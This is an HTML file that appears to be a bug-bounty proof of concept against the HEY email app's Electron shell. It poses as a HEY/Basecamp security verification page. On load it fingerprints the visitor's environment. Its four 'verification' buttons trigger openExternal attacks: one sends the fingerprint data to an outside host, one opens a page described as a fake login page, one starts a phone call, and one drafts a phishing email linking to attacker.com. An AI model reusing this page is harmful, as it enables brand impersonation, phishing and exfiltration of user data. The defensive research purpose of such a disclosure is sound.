<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>HEY — Verify Your Identity</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  background: #fdfaf4;
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
}
.container {
  background: #fff;
  border-radius: 12px;
  box-shadow: 0 4px 24px rgba(0,0,0,0.1);
  padding: 40px;
  max-width: 440px;
  width: 90%;
  text-align: center;
}
.logo { font-size: 32px; font-weight: 800; color: #5522fa; margin-bottom: 8px; }
.subtitle { color: #666; font-size: 14px; margin-bottom: 24px; }
.alert-box {
  background: #fff3cd;
  border: 1px solid #ffc107;
  border-radius: 8px;
  padding: 14px;
  margin-bottom: 20px;
  text-align: left;
  font-size: 13px;
  color: #856404;
}
.btn {
  display: block;
  width: 100%;
  padding: 14px;
  background: #5522fa;
  color: #fff;
  border: none;
  border-radius: 8px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  margin-bottom: 10px;
  transition: all 0.2s;
}
.btn:hover { background: #4411dd; transform: scale(1.01); }
.btn:active { transform: scale(0.99); }
.btn.done { background: #4caf50; pointer-events: none; }
.btn.fail { background: #999; pointer-events: none; }
.btn-outline {
  background: #fff;
  color: #5522fa;
  border: 2px solid #5522fa;
}
.btn-outline:hover { background: #f5f0ff; }
.btn-danger { background: #dc3545; }
.btn-danger:hover { background: #c82333; }
.btn-warning { background: #fd7e14; }
.btn-warning:hover { background: #e96b00; }
.footer { color: #999; font-size: 11px; margin-top: 16px; }
.result {
  font-size: 12px;
  padding: 6px;
  border-radius: 4px;
  margin-bottom: 10px;
  display: none;
}
.result.show { display: block; }
.result.ok { background: #d4edda; color: #155724; }
.result.err { background: #f8d7da; color: #721c24; }
.divider { border-top: 1px solid #eee; margin: 16px 0; }
.recon-box {
  background: #f8f9fa;
  border-radius: 8px;
  padding: 12px;
  margin-bottom: 16px;
  text-align: left;
  font-size: 12px;
  color: #333;
  font-family: monospace;
  display: none;
}
.recon-box.show { display: block; }
.phase-label {
  font-size: 11px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: #999;
  margin-bottom: 8px;
}
</style>
</head>
<body>

<div class="container">
  <div class="logo">HEY</div>
  <div class="subtitle">Security Verification</div>

  <div class="alert-box">
    ⚠️ Unusual activity detected. Please complete verification steps below.
  </div>

  <!-- RECON (auto-runs) -->
  <div class="recon-box" id="recon"></div>

  <!-- PHASE 1: Data Exfil (most important for bounty) -->
  <div class="phase-label">Step 1 of 4</div>
  <button class="btn" id="btn1" onclick="attack1(this)">Verify My Identity</button>
  <div class="result" id="r1"></div>

  <!-- PHASE 2: Phishing -->
  <div class="phase-label">Step 2 of 4</div>
  <button class="btn btn-outline" id="btn2" onclick="attack2(this)">Confirm Email Address</button>
  <div class="result" id="r2"></div>

  <!-- PHASE 3: tel -->
  <div class="phase-label">Step 3 of 4</div>
  <button class="btn btn-warning" id="btn3" onclick="attack3(this)">Receive Verification Call</button>
  <div class="result" id="r3"></div>

  <!-- PHASE 4: mailto -->
  <div class="phase-label">Step 4 of 4</div>
  <button class="btn btn-danger" id="btn4" onclick="attack4(this)">Send Confirmation Email</button>
  <div class="result" id="r4"></div>

  <div class="divider"></div>

  <div class="footer">
    HEY by Basecamp — Security Team<br>
    Verification expires in 24 hours.
  </div>
</div>

<script>
// ===== RECON (auto) =====
const ua = navigator.userAgent;
const isElectron = ua.includes('Electron') || typeof window.process !== 'undefined';
const bridge = typeof window.heyLab !== 'undefined' ? window.heyLab : null;
const chrMatch = ua.match(/Chrome\/(\d+)/);
const chrMajor = chrMatch ? parseInt(chrMatch[1]) : 0;
const hijacked = window.location.hostname !== 'localhost' || window.location.port !== '4000';

const fp = {
  e: isElectron,
  cr: chrMajor,
  p: navigator.platform,
  b: bridge,
  s: screen.width + 'x' + screen.height,
  l: navigator.language,
  o: window.location.origin,
  h: hijacked,
  t: new Date().toISOString()
};

const reconEl = document.getElementById('recon');
reconEl.innerHTML =
  'Electron: ' + (isElectron ? '<b style="color:green">YES</b>' : 'NO') + '<br>' +
  'Bridge: ' + (bridge ? '<b style="color:green">' + JSON.stringify(bridge) + '</b>' : 'none') + '<br>' +
  'Hijacked: ' + (hijacked ? '<b style="color:green">YES</b>' : 'NO') + '<br>' +
  'Chromium: ' + chrMajor + ' | Platform: ' + navigator.platform;
reconEl.classList.add('show');

function showResult(id, ok, msg) {
  const el = document.getElementById(id);
  el.textContent = msg;
  el.className = 'result show ' + (ok ? 'ok' : 'err');
}

// ===== ATTACK 1: Data Exfiltration =====
function attack1(btn) {
  btn.textContent = 'Verifying...';
  try {
    const data = encodeURIComponent(JSON.stringify(fp));
    const w = window.open('https://httpbin.org/get?d=' + data);
    btn.textContent = 'Verified ✓';
    btn.classList.add('done');
    showResult('r1', true, 'shell.openExternal FIRED → Data sent to attacker server. Check browser.');
  } catch(e) {
    btn.classList.add('fail');
    btn.textContent = 'Failed';
    showResult('r1', false, 'Blocked: ' + e.message);
  }
}

// ===== ATTACK 2: Phishing =====
function attack2(btn) {
  btn.textContent = 'Confirming...';
  try {
    const w = window.open('https://example.com');
    btn.textContent = 'Confirmed ✓';
    btn.classList.add('done');
    showResult('r2', true, 'shell.openExternal FIRED → Fake login page opened in browser.');
  } catch(e) {
    btn.classList.add('fail');
    btn.textContent = 'Failed';
    showResult('r2', false, 'Blocked: ' + e.message);
  }
}

// ===== ATTACK 3: tel: FaceTime =====
function attack3(btn) {
  btn.textContent = 'Calling...';
  try {
    const w = window.open('tel:1234567890');
    btn.textContent = 'Call Initiated ✓';
    btn.classList.add('done');
    showResult('r3', true, 'shell.openExternal FIRED → FaceTime/Phone call initiated.');
  } catch(e) {
    btn.classList.add('fail');
    btn.textContent = 'Failed';
    showResult('r3', false, 'Blocked: ' + e.message);
  }
}

// ===== ATTACK 4: mailto: =====
function attack4(btn) {
  btn.textContent = 'Sending...';
  try {
    const mailUrl = 'mailto:victim@company.com?subject=' +
      encodeURIComponent('URGENT: Password Reset') +
      '&body=' + encodeURIComponent('Account compromised. Reset now: https://attacker.com/reset');
    const w = window.open(mailUrl);
    btn.textContent = 'Email Sent ✓';
    btn.classList.add('done');
    showResult('r4', true, 'shell.openExternal FIRED → Mail compose opened with attacker content.');
  } catch(e) {
    btn.classList.add('fail');
    btn.textContent = 'Failed';
    showResult('r4', false, 'Blocked: ' + e.message);
  }
}
</script>
</body>
</html>
